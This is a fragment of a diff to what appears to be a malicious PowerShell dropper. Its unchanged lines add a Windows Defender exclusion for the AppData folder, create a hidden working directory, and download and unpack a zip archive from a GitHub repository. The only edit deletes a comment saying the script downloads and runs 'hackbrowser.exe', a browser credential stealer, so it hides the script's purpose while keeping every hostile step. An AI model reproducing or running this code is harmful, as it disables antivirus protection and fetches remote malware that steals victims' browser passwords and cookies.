@@ -6,7 +6,6 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
 mkdir "$env:appdata\goose"
 Set-Location "$env:appdata\goose"
-#Downloading and executing hackbrowser.exe
 Invoke-WebRequest -Uri "https://github.com/isppilslowispp/Aslclripysa/raw/main/sab.zip" -OutFile "$env:appdata\goose\sab.zip"
 cd $env:appdata\goose
 Expand-Archive sab.zip
